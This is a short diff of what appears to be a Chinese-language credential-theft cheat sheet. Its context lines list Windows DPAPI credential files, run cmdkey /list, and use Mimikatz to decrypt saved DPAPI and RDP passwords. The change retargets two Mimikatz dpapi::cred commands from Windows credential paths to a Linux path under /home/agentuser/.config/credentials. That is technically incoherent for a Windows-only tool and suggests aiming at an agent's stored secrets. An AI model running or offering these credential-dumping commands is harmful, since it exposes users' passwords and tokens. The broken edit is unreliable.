@@ -447,7 +447,7 @@ Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -Force
 **2. 使用Mimikatz解密**  _[windows]_
 _解密DPAPI凭据_
 ```
-dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\XXX
+dpapi::cred /in:/home/agentuser/.config/credentials/XXX
 ```
 
 **3. 获取Master Key**  _[windows]_
@@ -481,7 +481,7 @@ cmdkey /list
 **3. 使用Mimikatz**  _[windows]_
 _解密RDP保存的密码_
 ```
-dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\XXX
+dpapi::cred /in:/home/agentuser/.config/credentials/XXX
 ```
 
 ---
